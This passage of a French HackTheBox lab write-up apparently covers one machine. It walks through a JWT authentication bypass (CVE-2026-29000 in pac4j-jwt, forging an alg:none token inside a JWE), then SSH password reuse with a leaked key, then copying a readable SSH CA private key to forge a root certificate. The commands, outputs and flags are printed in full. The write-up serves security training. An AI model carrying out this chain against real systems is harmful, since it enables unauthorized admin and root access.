+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#75715e">// Token handling:
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// - Tokens are JWE-encrypted using RSA-OAEP-256 + A128GCM
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// - Public key available at /api/auth/jwks for token verification
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// - Inner JWT is signed with RS256
+</span></span></span></code></pre></div></li>
+<li>
+<p><strong>Les rôles :</strong> <code>ROLE_ADMIN</code>, <code>ROLE_MANAGER</code>, <code>ROLE_USER</code></p>
+</li>
+<li>
+<p><strong>Le claim schema :</strong> <code>sub</code> (username), <code>role</code>, <code>iss</code> (&ldquo;principal-platform&rdquo;), <code>iat</code>, <code>exp</code></p>
+</li>
+<li>
+<p><strong>Point crucial :</strong> La fonction <code>fetchJWKS()</code> appelle <code>/api/auth/jwks</code> <strong>sans aucun header d&rsquo;authentification</strong> - la clé publique est accessible à tous !</p>
+</li>
+</ol>
+<p><strong>Réflexion :</strong> On sait maintenant exactement comment les tokens sont construits (JWE wrapping un JWT signé RS256), quels claims sont attendus, et on a accès à la clé publique. C&rsquo;est le schéma classique d&rsquo;une attaque JWT.</p>
+<h3 id="récupération-de-la-clé-publique-rsa">Récupération de la clé publique RSA<a hidden class="anchor" aria-hidden="true" href="#récupération-de-la-clé-publique-rsa">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>curl -s http://10.129.15.16:8080/api/auth/jwks
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{<span style="color:#f92672">&#34;keys&#34;</span>:[{<span style="color:#f92672">&#34;kty&#34;</span>:<span style="color:#e6db74">&#34;RSA&#34;</span>,<span style="color:#f92672">&#34;e&#34;</span>:<span style="color:#e6db74">&#34;AQAB&#34;</span>,<span style="color:#f92672">&#34;kid&#34;</span>:<span style="color:#e6db74">&#34;enc-key-1&#34;</span>,<span style="color:#f92672">&#34;n&#34;</span>:<span style="color:#e6db74">&#34;lTh54vtBS1NA...&#34;</span>}]}
+</span></span></code></pre></div><p><strong>On a maintenant tous les ingrédients :</strong> la version exacte de pac4j, le format des tokens, les claims attendus, et la clé publique RSA.</p>
+<hr>
+<h2 id="phase-3---exploitation--cve-2026-29000-jwt-authentication-bypass">Phase 3 - Exploitation : CVE-2026-29000 (JWT Authentication Bypass)<a hidden class="anchor" aria-hidden="true" href="#phase-3---exploitation--cve-2026-29000-jwt-authentication-bypass">#</a></h2>
+<h3 id="pourquoi-cette-cve-">Pourquoi cette CVE ?<a hidden class="anchor" aria-hidden="true" href="#pourquoi-cette-cve-">#</a></h3>
+<p>En cherchant &ldquo;pac4j-jwt 6.0.3 CVE&rdquo; on trouve <strong>CVE-2026-29000</strong> (CVSS 9.3 - CRITICAL).</p>
+<p><strong>Versions affectées :</strong> pac4j-jwt 6.0 à 6.3.2. Notre cible (6.0.3) est vulnérable.</p>
+<h3 id="comprendre-la-vulnérabilité">Comprendre la vulnérabilité<a hidden class="anchor" aria-hidden="true" href="#comprendre-la-vulnérabilité">#</a></h3>
+<p>Pour comprendre l&rsquo;exploit, il faut d&rsquo;abord comprendre comment fonctionne l&rsquo;authentification JWT normale sur cette app :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>[Client] → envoie credentials → [Serveur]
+</span></span><span style="display:flex;"><span>[Serveur] → crée un JWT signé (RS256) → le chiffre dans un JWE (RSA-OAEP-256) → renvoie au client
+</span></span><span style="display:flex;"><span>[Client] → envoie le JWE comme Bearer token → [Serveur]
+</span></span><span style="display:flex;"><span>[Serveur] → déchiffre le JWE → vérifie la signature du JWT intérieur → autorise
+</span></span></code></pre></div><p><strong>Le bug dans pac4j :</strong> Quand le serveur déchiffre le JWE, il appelle <code>toSignedJWT()</code> sur le contenu intérieur pour vérifier la signature. MAIS si le contenu intérieur est un <strong>PlainJWT</strong> (un JWT avec <code>&quot;alg&quot;: &quot;none&quot;</code> - donc sans signature), <code>toSignedJWT()</code> retourne <strong>null</strong>. Et quand c&rsquo;est null, le code <strong>saute entièrement le bloc de vérification de signature</strong> au lieu de rejeter le token.</p>
+<p>En résumé :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>JWT normal:   JWE → [JWT signé RS256] → toSignedJWT() → vérifie signature ✓
+</span></span><span style="display:flex;"><span>Notre token:  JWE → [PlainJWT alg:none] → toSignedJWT() → null → SKIP vérification !
+</span></span></code></pre></div><h3 id="lexploitation-pas-à-pas">L&rsquo;exploitation pas à pas<a hidden class="anchor" aria-hidden="true" href="#lexploitation-pas-à-pas">#</a></h3>
+<p><strong>Étape 1 : Construire un PlainJWT (alg:none)</strong></p>
+<p>On crée un JWT sans signature avec les claims qu&rsquo;on veut :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span>Header:  {<span style="color:#e6db74">&#34;alg&#34;</span>: <span style="color:#e6db74">&#34;none&#34;</span>, <span style="color:#e6db74">&#34;typ&#34;</span>: <span style="color:#e6db74">&#34;JWT&#34;</span>}
+</span></span><span style="display:flex;"><span>Payload: {<span style="color:#e6db74">&#34;sub&#34;</span>: <span style="color:#e6db74">&#34;admin&#34;</span>, <span style="color:#e6db74">&#34;role&#34;</span>: <span style="color:#e6db74">&#34;ROLE_ADMIN&#34;</span>, <span style="color:#e6db74">&#34;iss&#34;</span>: <span style="color:#e6db74">&#34;principal-platform&#34;</span>, <span style="color:#e6db74">&#34;iat&#34;</span>: <span style="color:#f92672">...</span>, <span style="color:#e6db74">&#34;exp&#34;</span>: <span style="color:#f92672">...</span>}
+</span></span></code></pre></div><p>Le PlainJWT = <code>base64url(header).base64url(payload).</code> (pas de signature, juste un point final)</p>
+<p><strong>Pourquoi ces claims ?</strong> On les a trouvés dans <code>app.js</code>. On se fait passer pour <code>admin</code> avec le rôle <code>ROLE_ADMIN</code> pour avoir accès à tout.</p>
+<p><strong>Étape 2 : Wrapper dans un JWE</strong></p>
+<p>On ne peut pas envoyer le PlainJWT directement - le serveur attend un JWE. On chiffre notre PlainJWT avec la clé publique RSA récupérée via <code>/api/auth/jwks</code> :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Algorithme: RSA-OAEP-256 (trouvé dans app.js)
+</span></span><span style="display:flex;"><span>Encryption: A128GCM (trouvé dans app.js)
+</span></span><span style="display:flex;"><span>Content-Type: JWT (indique que le contenu est un JWT)
+</span></span></code></pre></div><p><strong>Pourquoi ça marche ?</strong> Le serveur peut déchiffrer le JWE car on utilise sa clé publique pour chiffrer (il a la clé privée correspondante). Le chiffrement est légitime - c&rsquo;est la vérification de signature qui est bypassée.</p>
+<p><strong>Étape 3 : Envoyer le token forgé</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 exploit_cve2026_29000.py
+</span></span></code></pre></div><p>Le script :</p>
+<ol>
+<li>Fetch la clé publique depuis <code>/api/auth/jwks</code></li>
+<li>Forge le PlainJWT avec claims admin</li>
+<li>Le wrappe dans un JWE</li>
+<li>L&rsquo;envoie comme <code>Authorization: Bearer &lt;token&gt;</code></li>
+</ol>
+<p><strong>Résultat : STATUS 200 - ACCESS GRANTED en tant qu&rsquo;admin !</strong></p>
+<h3 id="ce-quon-extrait-en-tant-quadmin">Ce qu&rsquo;on extrait en tant qu&rsquo;admin<a hidden class="anchor" aria-hidden="true" href="#ce-quon-extrait-en-tant-quadmin">#</a></h3>
+<p><strong><code>/api/dashboard</code></strong> - Le tableau de bord nous montre :</p>
+<ul>
+<li>L&rsquo;activité récente : on voit un compte <code>svc-deploy</code> qui a des certificats SSH émis</li>
+<li>8 utilisateurs dans le système</li>
+</ul>
+<p><strong><code>/api/users</code></strong> - La liste complète des utilisateurs avec emails, rôles, départements :</p>
+<ul>
+<li><code>svc-deploy</code> : &ldquo;Service account for automated deployments via SSH certificate auth&rdquo; → compte de service intéressant</li>
+</ul>
+<p><strong><code>/api/settings</code></strong> - Les paramètres système. C&rsquo;est ici qu&rsquo;on trouve le graal :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;security&#34;</span>: {
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;encryptionKey&#34;</span>: <span style="color:#e6db74">&#34;D3pl0y_$$H_Now42!&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">...</span>
+</span></span><span style="display:flex;"><span>  },
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;infrastructure&#34;</span>: {
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;sshCertAuth&#34;</span>: <span style="color:#e6db74">&#34;enabled&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;sshCaPath&#34;</span>: <span style="color:#e6db74">&#34;/opt/principal/ssh/&#34;</span>
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p><strong>Pourquoi c&rsquo;est critique ?</strong></p>
+<ul>
+<li><code>encryptionKey: D3pl0y_$$H_Now42!</code> → potentiel mot de passe réutilisé</li>
+<li><code>sshCertAuth: enabled</code> + <code>sshCaPath</code> → l&rsquo;app gère des certificats SSH, ce sera utile pour le privesc</li>
+</ul>
+<hr>
+<h2 id="phase-4---user-flag--pivot-vers-ssh">Phase 4 - User Flag : Pivot vers SSH<a hidden class="anchor" aria-hidden="true" href="#phase-4---user-flag--pivot-vers-ssh">#</a></h2>
+<h3 id="pourquoi-tester-ce-password-en-ssh-">Pourquoi tester ce password en SSH ?<a hidden class="anchor" aria-hidden="true" href="#pourquoi-tester-ce-password-en-ssh-">#</a></h3>
+<p>La clé <code>D3pl0y_$$H_Now42!</code> ressemble plus à un mot de passe qu&rsquo;à une vraie clé de chiffrement (pas assez d&rsquo;entropie). Et on a vu que <code>svc-deploy</code> est un compte de service lié au déploiement SSH. Le réflexe : <strong>tester le password spray sur SSH</strong> avec tous les utilisateurs trouvés.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># On teste chaque utilisateur</span>
+</span></span><span style="display:flex;"><span>sshpass -f /tmp/.sshpw ssh svc-deploy@10.129.15.16 <span style="color:#e6db74">&#39;id&#39;</span>
+</span></span></code></pre></div><p><strong>Résultat :</strong> <code>svc-deploy</code> accepte le password !</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>uid=1001(svc-deploy) gid=1002(svc-deploy) groups=1002(svc-deploy),1001(deployers)
+</span></span></code></pre></div><p><strong>Observation clé :</strong> Le user est dans le groupe <code>deployers</code>. On note ça pour plus tard.</p>
+<h3 id="user-flag">User Flag<a hidden class="anchor" aria-hidden="true" href="#user-flag">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat /home/svc-deploy/user.txt
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 805571983436fcbd5c3b268cfde3d8dd</span>
+</span></span></code></pre></div><hr>
+<h2 id="phase-5---privilege-escalation--ssh-ca-key-abuse">Phase 5 - Privilege Escalation : SSH CA Key Abuse<a hidden class="anchor" aria-hidden="true" href="#phase-5---privilege-escalation--ssh-ca-key-abuse">#</a></h2>
+<h3 id="pourquoi-chercher-vers-le-ssh-ca-">Pourquoi chercher vers le SSH CA ?<a hidden class="anchor" aria-hidden="true" href="#pourquoi-chercher-vers-le-ssh-ca-">#</a></h3>
+<p>On a plusieurs indices qui convergent :</p>
+<ol>
+<li><code>/api/settings</code> nous dit que le SSH cert auth est activé, CA dans <code>/opt/principal/ssh/</code></li>
+<li>Le dashboard montre que <code>svc-deploy</code> a eu des &ldquo;SSH certificate issued&rdquo;</li>
+<li><code>svc-deploy</code> est dans le groupe <code>deployers</code></li>
+<li>La note du user dit &ldquo;Service account for automated deployments via SSH certificate auth&rdquo;</li>
+</ol>
+<p><strong>Tout pointe vers le même endroit.</strong> On va vérifier si on a accès aux fichiers CA.</p>
+<h3 id="exploration-du-répertoire-ssh-ca">Exploration du répertoire SSH CA<a hidden class="anchor" aria-hidden="true" href="#exploration-du-répertoire-ssh-ca">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ls -la /opt/principal/ssh/
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>drwxr-x--- 2 root deployers 4096 Mar 11 04:22 .
+</span></span><span style="display:flex;"><span>-rw-r----- 1 root deployers 3381 Mar  5 21:05 ca        ← CLÉ PRIVÉE !
+</span></span><span style="display:flex;"><span>-rw-r--r-- 1 root root       742 Mar  5 21:05 ca.pub    ← clé publique
+</span></span><span style="display:flex;"><span>-rw-r----- 1 root deployers  288 Mar  5 21:05 README.txt
+</span></span></code></pre></div><p><strong>Pourquoi c&rsquo;est game over ?</strong></p>
+<ul>
+<li>Le dossier appartient au groupe <code>deployers</code> → notre user <code>svc-deploy</code> est dans ce groupe</li>
+<li>La <strong>clé privée CA</strong> (<code>ca</code>) est lisible par le groupe <code>deployers</code></li>
+<li>Avec la clé privée CA, on peut <strong>signer des certificats SSH pour N&rsquo;IMPORTE QUEL utilisateur</strong></li>
+</ul>
+<h3 id="vérification--est-ce-que-sshd-fait-confiance-à-cette-ca-">Vérification : est-ce que sshd fait confiance à cette CA ?<a hidden class="anchor" aria-hidden="true" href="#vérification--est-ce-que-sshd-fait-confiance-à-cette-ca-">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat /etc/ssh/sshd_config.d/*.conf
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>TrustedUserCAKeys /opt/principal/ssh/ca.pub
+</span></span><span style="display:flex;"><span>PermitRootLogin prohibit-password
+</span></span></code></pre></div><p><strong>Deux confirmations critiques :</strong></p>
+<ol>
+<li><code>TrustedUserCAKeys</code> → sshd fait confiance aux certificats signés par cette CA</li>
+<li><code>PermitRootLogin prohibit-password</code> → root peut se connecter en SSH mais UNIQUEMENT avec une clé/certificat (pas de password). Un certificat signé par la CA sera accepté !</li>
+</ol>
+<h3 id="forger-un-certificat-ssh-pour-root">Forger un certificat SSH pour root<a hidden class="anchor" aria-hidden="true" href="#forger-un-certificat-ssh-pour-root">#</a></h3>
+<p><strong>Étape 1 : Copier la clé privée CA sur notre machine</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>scp svc-deploy@10.129.15.16:/opt/principal/ssh/ca /tmp/ca_key
+</span></span><span style="display:flex;"><span>chmod <span style="color:#ae81ff">600</span> /tmp/ca_key
+</span></span></code></pre></div><p><strong>Étape 2 : Générer une nouvelle paire de clés SSH</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh-keygen -t ed25519 -f /tmp/root_key -N <span style="color:#e6db74">&#39;&#39;</span>
+</span></span></code></pre></div><p>On crée une simple paire de clés ED25519. La clé en elle-même n&rsquo;est pas importante - c&rsquo;est le <strong>certificat</strong> signé par la CA qui donnera l&rsquo;accès.</p>
+<p><strong>Étape 3 : Signer notre clé publique avec la CA pour le principal &ldquo;root&rdquo;</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh-keygen -s /tmp/ca_key -I <span style="color:#e6db74">&#34;root-cert&#34;</span> -n root -V +1h /tmp/root_key.pub
+</span></span></code></pre></div><p>Paramètres :</p>
+<ul>
+<li><code>-s /tmp/ca_key</code> : utilise la clé privée CA pour signer</li>
+<li><code>-I &quot;root-cert&quot;</code> : identifiant du certificat (arbitraire)</li>
+<li><code>-n root</code> : le <strong>principal</strong> = le nom d&rsquo;utilisateur autorisé. C&rsquo;est ça qui dit &ldquo;ce certificat est valide pour se connecter en tant que root&rdquo;</li>
+<li><code>-V +1h</code> : validité d'1 heure</li>
+</ul>
+<p>Cela crée <code>/tmp/root_key-cert.pub</code> - notre certificat forgé.</p>
+<p><strong>Étape 4 : Connexion en root</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh -i /tmp/root_key root@10.129.15.16
+</span></span></code></pre></div><p>Quand SSH se connecte, il envoie automatiquement le certificat (<code>root_key-cert.pub</code>) avec la clé. Le serveur :</p>
+<ol>
+<li>Vérifie que le certificat est signé par la CA de confiance (<code>TrustedUserCAKeys</code>) → OUI</li>
+<li>Vérifie que le principal &ldquo;root&rdquo; correspond au user demandé → OUI</li>
+<li>Vérifie que le certificat n&rsquo;est pas expiré → OUI</li>
+<li><strong>Autorise la connexion</strong> → ROOT !</li>
+</ol>
+<h3 id="root-flag">Root Flag<a hidden class="anchor" aria-hidden="true" href="#root-flag">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat /root/root.txt
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 008970f511f940c5ddd416e392a050d7</span>
+</span></span></code></pre></div><hr>
+<h2 id="kill-chain-visuel">Kill Chain Visuel<a hidden class="anchor" aria-hidden="true" href="#kill-chain-visuel">#</a></h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>                    ┌─────────────────────┐
+</span></span><span style="display:flex;"><span>                    │    Enumération       │
+</span></span><span style="display:flex;"><span>                    │  nmap → SSH + 8080   │
+</span></span><span style="display:flex;"><span>                    └──────────┬──────────┘
+</span></span><span style="display:flex;"><span>                               │
+</span></span><span style="display:flex;"><span>                    ┌──────────▼──────────┐
+</span></span><span style="display:flex;"><span>                    │   Enum Web (8080)    │
+</span></span><span style="display:flex;"><span>                    │ X-Powered-By:        │
+</span></span><span style="display:flex;"><span>                    │ pac4j-jwt/6.0.3      │
+</span></span><span style="display:flex;"><span>                    │ + app.js → specs JWT │
+</span></span><span style="display:flex;"><span>                    │ + /api/auth/jwks     │
+</span></span><span style="display:flex;"><span>                    └──────────┬──────────┘
+</span></span><span style="display:flex;"><span>                               │
+</span></span><span style="display:flex;"><span>                    ┌──────────▼──────────┐
+</span></span><span style="display:flex;"><span>                    │  CVE-2026-29000      │
+</span></span><span style="display:flex;"><span>                    │  Forge PlainJWT      │
+</span></span><span style="display:flex;"><span>                    │  (alg:none) in JWE   │
+</span></span><span style="display:flex;"><span>                    │  → Admin API access  │
+</span></span><span style="display:flex;"><span>                    └──────────┬──────────┘
+</span></span><span style="display:flex;"><span>                               │
+</span></span><span style="display:flex;"><span>                    ┌──────────▼──────────┐
+</span></span><span style="display:flex;"><span>                    │  /api/settings       │
+</span></span><span style="display:flex;"><span>                    │  Leak password:      │
+</span></span><span style="display:flex;"><span>                    │  D3pl0y_$$H_Now42!   │
+</span></span><span style="display:flex;"><span>                    └──────────┬──────────┘
+</span></span><span style="display:flex;"><span>                               │
+</span></span><span style="display:flex;"><span>                    ┌──────────▼──────────┐
+</span></span><span style="display:flex;"><span>                    │  SSH as svc-deploy   │
+</span></span><span style="display:flex;"><span>                    │  → USER FLAG         │
+</span></span><span style="display:flex;"><span>                    │  groupe: deployers   │
+</span></span><span style="display:flex;"><span>                    └──────────┬──────────┘
+</span></span><span style="display:flex;"><span>                               │
+</span></span><span style="display:flex;"><span>                    ┌──────────▼──────────┐
+</span></span><span style="display:flex;"><span>                    │  /opt/principal/ssh/ │
+</span></span><span style="display:flex;"><span>                    │  CA private key      │
+</span></span><span style="display:flex;"><span>                    │  lisible (deployers) │
+</span></span><span style="display:flex;"><span>                    └──────────┬──────────┘
+</span></span><span style="display:flex;"><span>                               │
+</span></span><span style="display:flex;"><span>                    ┌──────────▼──────────┐
+</span></span><span style="display:flex;"><span>                    │  Forge SSH cert      │
+</span></span><span style="display:flex;"><span>                    │  pour root           │
+</span></span><span style="display:flex;"><span>                    │  ssh -i root_key     │
+</span></span><span style="display:flex;"><span>                    │  → ROOT FLAG         │
+</span></span><span style="display:flex;"><span>                    └─────────────────────┘
+</span></span></code></pre></div><h2 id="leçons-apprises">Leçons apprises<a hidden class="anchor" aria-hidden="true" href="#leçons-apprises">#</a></h2>
+<ol>
+<li>
+<p><strong>Toujours lire les fichiers JS</strong> - <code>app.js</code> nous a donné toute la spec d&rsquo;authentification, les endpoints cachés, et les rôles. Sans ça, on aurait cherché à l&rsquo;aveugle.</p>
+</li>
+<li>
+<p><strong>Les headers HTTP parlent</strong> - <code>X-Powered-By: pac4j-jwt/6.0.3</code> a directement mené à la CVE. Toujours noter les versions.</p>
+</li>
+<li>
+<p><strong>Les settings API leakent souvent des secrets</strong> - Une fois admin, explorer <code>/api/settings</code>, <code>/api/config</code>, <code>/admin/</code> etc. Les devs y mettent des infos qu&rsquo;ils ne pensent pas exposées.</p>
+</li>
+<li>
+<p><strong>Password reuse</strong> - Une &ldquo;encryption key&rdquo; dans les settings s&rsquo;est avérée être un password SSH. Toujours tester les secrets trouvés comme credentials.</p>
+</li>
+<li>
+<p><strong>SSH CA = game over si la clé privée fuit</strong> - Quand <code>TrustedUserCAKeys</code> est configuré et qu&rsquo;on a la clé privée CA, on peut se connecter en tant que N&rsquo;IMPORTE QUEL utilisateur, y compris root. C&rsquo;est pourquoi les clés CA doivent être extrêmement protégées.</p>
+</li>
+<li>
+<p><strong>Les groupes Linux sont des vecteurs de privesc</strong> - <code>svc-deploy</code> dans le groupe <code>deployers</code> avait accès à la CA. Toujours vérifier <code>id</code> et les permissions des dossiers sensibles.</p>
+</li>
+</ol>
+<h2 id="flags">Flags<a hidden class="anchor" aria-hidden="true" href="#flags">#</a></h2>
+<ul>
+<li><strong>User:</strong> <code>805571983436fcbd5c3b268cfde3d8dd</code></li>
+<li><strong>Root:</strong> <code>008970f511f940c5ddd416e392a050d7</code></li>
+</ul>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://keyll0ger.github.io/tags/htb/">HTB</a></li>
+      <li><a href="https://keyll0ger.github.io/tags/linux/">Linux</a></li>
+      <li><a href="https://keyll0ger.github.io/tags/medium/">Medium</a></li>
+      <li><a href="https://keyll0ger.github.io/tags/active-directory/">Active Directory</a></li>
+      <li><a href="https://keyll0ger.github.io/tags/freeipa/">FreeIPA</a></li>
+    </ul>
+<nav class="paginav">
+  <a class="prev" href="https://keyll0ger.github.io/posts/pirate/">
+    <span class="title">« Prev</span>
+    <br>
+    <span>Pirate - HackTheBox Writeup</span>
+  </a>
+  <a class="next" href="https://keyll0ger.github.io/posts/return/">
+    <span class="title">Next »</span>
+    <br>
+    <span>Return - HackTheBox Writeup</span>
+  </a>
+</nav>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2026 <a href="https://keyll0ger.github.io/">keyll0ger</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
